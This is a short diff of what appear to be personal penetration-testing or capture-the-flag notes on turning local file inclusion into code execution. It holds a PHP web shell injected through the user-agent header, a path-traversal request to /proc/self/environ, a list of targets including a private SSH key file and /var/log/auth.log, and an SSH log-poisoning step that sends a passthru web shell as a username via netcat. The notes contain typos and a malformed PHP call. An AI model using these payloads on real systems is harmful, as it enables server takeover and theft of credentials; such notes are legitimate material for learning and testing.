@@ -16,3 +16,10 @@ change user-agent: <?php system[$_GET['cmd']); ?>
 
 <url>/console?file=../../../../../proc/self/environ?cmd=id
 ```
+```
+/home/user/.ssh/id_rsa
+/var/log/auth.log
+try ssh poisinong
+nc -nv <ip> 22
+omgthissofun/<?php passthru($_GET['cmd']); ?>          # this will refeclt in /var/log/auth.log
+```
